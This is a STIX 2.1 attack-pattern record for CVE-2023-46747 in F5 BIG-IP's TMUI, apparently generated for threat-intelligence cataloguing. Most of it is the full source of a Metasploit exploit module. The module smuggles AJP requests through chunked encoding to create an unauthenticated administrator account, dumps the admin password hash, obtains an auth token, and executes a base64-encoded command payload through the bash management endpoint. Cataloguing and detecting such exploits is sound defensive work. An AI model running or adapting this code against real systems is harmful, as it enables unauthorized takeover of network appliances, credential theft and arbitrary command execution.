{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cdb7eddb-3a2a-4607-87f7-a53765568432",
    "created": "2024-08-14T17:02:47.124174Z",
    "modified": "2024-08-14T17:02:47.124178Z",
    "name": "F5 BIG-IP TMUI AJP Smuggling RCE",
    "description": " This module exploits a flaw in F5's BIG-IP Traffic Management User Interface (TMUI) that enables an external unauthenticated attacker to create an administrative user. Once the user is created, the module uses the new account to execute a command payload. Both the exploit and check methods automatically delete any temporary accounts that are created. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/f5_bigip_tmui_rce_cve_2023_46747.rb",
            "external_id": "f5_bigip_tmui_rce_cve_2023_46747.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-46747"
        },
        {
            "source_name": "reference",
            "url": "https://www.praetorian.com/blog/refresh-compromising-f5-big-ip-with-request-smuggling-cve-2023-46747/"
        },
        {
            "source_name": "reference",
            "url": "https://www.praetorian.com/blog/advisory-f5-big-ip-rce/"
        },
        {
            "source_name": "reference",
            "url": "https://my.f5.com/manage/s/article/K000137353"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/projectdiscovery/nuclei-templates/pull/8496"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/t52A9pctHn/cve-2023-46747/rapid7-analysis"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/proto/apache_j_p'\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Retry\n\n  ApacheJP = Rex::Proto::ApacheJP\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'F5 BIG-IP TMUI AJP Smuggling RCE',\n        'Description' => %q{\n          This module exploits a flaw in F5's BIG-IP Traffic Management User Interface (TMUI) that enables an external,\n          unauthenticated attacker to create an administrative user. Once the user is created, the module uses the new\n          account to execute a command payload. Both the exploit and check methods automatically delete any temporary\n          accounts that are created.\n        },\n        'Author' => [\n          'Michael Weber', # vulnerability analysis\n          'Thomas Hendrickson', # vulnerability analysis\n          'Sandeep Singh', # nuclei template\n          'Spencer McIntyre' # metasploit module\n        ],\n        'References' => [\n          ['CVE', '2023-46747'],\n          ['URL', 'https://www.praetorian.com/blog/refresh-compromising-f5-big-ip-with-request-smuggling-cve-2023-46747/'],\n          ['URL', 'https://www.praetorian.com/blog/advisory-f5-big-ip-rce/'],\n          ['URL', 'https://my.f5.com/manage/s/article/K000137353'],\n          ['URL', 'https://github.com/projectdiscovery/nuclei-templates/pull/8496'],\n          ['URL', 'https://attackerkb.com/topics/t52A9pctHn/cve-2023-46747/rapid7-analysis']\n        ],\n        'DisclosureDate' => '2023-10-26', # Vendor advisory\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Command',\n            {\n              'Platform' => ['unix', 'linux'],\n              'Arch' => ARCH_CMD\n            }\n          ],\n        ],\n        'DefaultOptions' => {\n          'SSL' => true,\n          'RPORT' => 443,\n          'FETCH_WRITABLE_DIR' => '/tmp'\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [\n            IOC_IN_LOGS, # user creation events are logged\n            CONFIG_CHANGES # a temporary user is created then deleted\n          ]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  def check\n    res = create_user(role: 'Guest')\n    return CheckCode::Unknown('No response received from target.') unless res\n    return CheckCode::Safe('Failed to create the user.') unless res.code == 200\n\n    changed = update_user_password\n    return CheckCode::Safe('Failed to set the new user\\'s password.') unless changed\n\n    res = bigip_api_tm_get_user(username)\n    return CheckCode::Safe('Failed to validate the new user account.') unless res.get_json_document['kind'] == 'tm:auth:user:userstate'\n\n    CheckCode::Vulnerable('Successfully tested unauthenticated user creation.')\n  end\n\n  def exploit\n    res = create_user(role: 'Administrator')\n    fail_with(Failure::UnexpectedReply, 'Failed to create the user.') unless res&.code == 200\n\n    changed = update_user_password\n    fail_with(Failure::UnexpectedReply, 'Failed to set the new user\\'s password.') unless changed\n\n    print_good(\"Admin user was created successfully. Credentials: #{username} - #{password}\")\n\n    res = bigip_api_tm_get_user('admin')\n    if res&.code == 200 && (hash = res.get_json_document['encryptedPassword']).present?\n      print_good(\"Retrieved the admin hash: #{hash}\")\n      report_hash('admin', hash)\n    end\n\n    logged_in = retry_until_truthy(timeout: 30) do\n      res = bigip_api_shared_login\n      res&.code == 200\n    end\n    fail_with(Failure::UnexpectedReply, 'Failed to login.') unless logged_in\n\n    token = res.get_json_document.dig('token', 'token')\n    fail_with(Failure::UnexpectedReply, 'Failed to obtain a login token.') if token.blank?\n\n    print_status(\"Obtained login token: #{token}\")\n\n    bash_cmd = \"eval $(echo #{Rex::Text.encode_base64(payload.encoded)} | base64 -d)\"\n    # this may or may not timeout\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'mgmt/tm/util/bash'),\n      'headers' => {\n        'Content-Type' => 'application/json',\n        'X-F5-Auth-Token' => token\n      },\n      'data' => { 'command' => 'run', 'utilCmdArgs' => \"-c '#{bash_cmd}'\" }.to_json\n    )\n  end\n\n  def report_hash(user, hash)\n    jtr_format = Metasploit::Framework::Hashes.identify_hash(hash)\n    service_data = {\n      address: rhost,\n      port: rport,\n      service_name: 'F5 BIG-IP TMUI',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n    credential_data = {\n      module_fullname: fullname,\n      origin_type: :service,\n      private_data: hash,\n      private_type: :nonreplayable_hash,\n      jtr_format: jtr_format,\n      username: user\n    }.merge(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def cleanup\n    super\n\n    print_status('Deleting the created user...')\n    delete_user\n  end\n\n  def username\n    @username ||= rand_text_alpha(6..8)\n  end\n\n  def password\n    @password ||= rand_text_alphanumeric(16..20)\n  end\n\n  def create_user(role:)\n    # for roles and descriptions, see: https://techdocs.f5.com/kb/en-us/products/big-ip_ltm/manuals/product/bigip-user-account-administration-11-6-0/3.html\n    send_request_smuggled_ajp({\n      'handler' => '/tmui/system/user/create',\n      'form_page' => '/tmui/system/user/create.jsp',\n      'systemuser-hidden' => \"[[\\\"#{role}\\\",\\\"[All]\\\"]]\",\n      'systemuser-hidden_before' => '',\n      'name' => username,\n      'name_before' => '',\n      'passwd' => password,\n      'passwd_before' => '',\n      'finished' => 'x',\n      'finished_before' => ''\n    })\n  end\n\n  def delete_user\n    send_request_smuggled_ajp({\n      'handler' => '/tmui/system/user/list',\n      'form_page' => '/tmui/system/user/list.jsp',\n      'checkbox0' => username,\n      'checkbox0_before' => 'checked',\n      'delete_confirm' => 'Delete',\n      'delete_confirm_before' => 'Delete',\n      'row_count' => '1',\n      'row_count_before' => '1'\n    })\n  end\n\n  def update_user_password\n    new_password = Rex::Text.rand_text_alphanumeric(password.length)\n    changed = retry_until_truthy(timeout: 30) do\n      res = bigip_api_shared_set_password(username, password, new_password)\n      res&.code == 200\n    end\n    @password = new_password if changed\n    changed\n  end\n\n  def send_request_smuggled_ajp(query)\n    post_data = \"204\\r\\n\" # do not change\n\n    timenow = rand_text_numeric(1)\n    tmui_dubbuf = rand_text_alpha_upper(11)\n\n    query = query.merge({\n      '_bufvalue' => Base64.strict_encode64(OpenSSL::Digest::SHA1.new(tmui_dubbuf + timenow).digest),\n      '_bufvalue_before' => '',\n      '_timenow' => timenow,\n      '_timenow_before' => ''\n    })\n    query_string = URI.encode_www_form(query).ljust(370, '&')\n\n    # see: https://tomcat.apache.org/tomcat-3.3-doc/ApacheJP.html#prefix-codes\n    ajp_forward_request = ApacheJP::ApacheJPForwardRequest.new(\n      http_method: ApacheJP::ApacheJPForwardRequest::HTTP_METHOD_POST,\n      req_uri: '/tmui/Control/form',\n      remote_addr: '127.0.0.1',\n      remote_host: 'localhost',\n      server_name: 'localhost',\n      headers: [\n        { header_name: 'Tmui-Dubbuf', header_value: tmui_dubbuf },\n        { header_name: 'REMOTEROLE', header_value: '0' },\n        { header_name: 'host', header_value: 'localhost' }\n      ],\n      attributes: [\n        { code: ApacheJP::ApacheJPRequestAttribute::CODE_REMOTE_USER, attribute_value: 'admin' },\n        { code: ApacheJP::ApacheJPRequestAttribute::CODE_QUERY_STRING, attribute_value: query_string },\n        { code: ApacheJP::ApacheJPRequestAttribute::CODE_TERMINATOR }\n      ]\n    )\n    ajp_data = ajp_forward_request.to_binary_s[2...]\n    unless ajp_data.length == 0x204 # 516 bytes\n      # this is a developer error\n      raise \"AJP data must be 0x204 bytes, is 0x#{ajp_data.length.to_s(16)} bytes.\"\n    end\n\n    post_data << ajp_data\n    post_data << \"\\r\\n0\"\n\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'tmui/login.jsp'),\n      'headers' => { 'Transfer-Encoding' => 'chunked, chunked' },\n      'data' => post_data\n    )\n  end\n\n  def bigip_api_shared_set_password(user, old_password, new_password)\n    send_request_cgi(\n      'method' => 'PATCH',\n      'uri' => normalize_uri(target_uri.path, 'mgmt/shared/authz/users', user),\n      'headers' => {\n        'Authorization' => \"Basic #{Rex::Text.encode_base64(\"#{username}:#{password}\")}\",\n        'Content-Type' => 'application/json'\n      },\n      'data' => { 'oldPassword' => old_password, 'password' => new_password }.to_json\n    )\n  end\n\n  def bigip_api_shared_login\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'mgmt/shared/authn/login'),\n      'headers' => { 'Content-Type' => 'application/json' },\n      'data' => { 'username' => username, 'password' => password }.to_json\n    )\n  end\n\n  def bigip_api_tm_get_user(user)\n    send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'mgmt/tm/auth/user', user),\n      'headers' => {\n        'Authorization' => \"Basic #{Rex::Text.encode_base64(\"#{username}:#{password}\")}\",\n        'Content-Type' => 'application/json'\n      }\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-10-26, # Vendor advisory",
    "x_mitre_platforms": [
        "['unix', 'linux']"
    ]
}